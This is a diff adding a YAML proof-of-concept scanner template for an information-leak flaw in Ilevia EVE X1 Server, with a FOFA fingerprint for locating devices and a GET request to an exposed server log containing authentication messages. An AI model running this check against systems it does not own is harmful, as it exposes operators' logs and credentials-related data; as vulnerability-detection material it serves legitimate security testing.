@@ -1,0 +1,24 @@
+id: poc-yaml-ilevia-eve-x1-server-eve-server-log-info-leak
+info:
+  name: Ilevia EVE X1 服务器 eve-server.log 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: ilevia_eve_x1_server
+  fofa: icon_hash="392278119"
+requests:
+- method: GET
+  path: /80-history/eve-server.log
+  expression: 'status_code == 200 &&
+
+    contains(body,"serverFile") &&
+
+    contains(body,"Info Message") &&
+
+    contains(body,"[SUCCESS] Authenticate") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
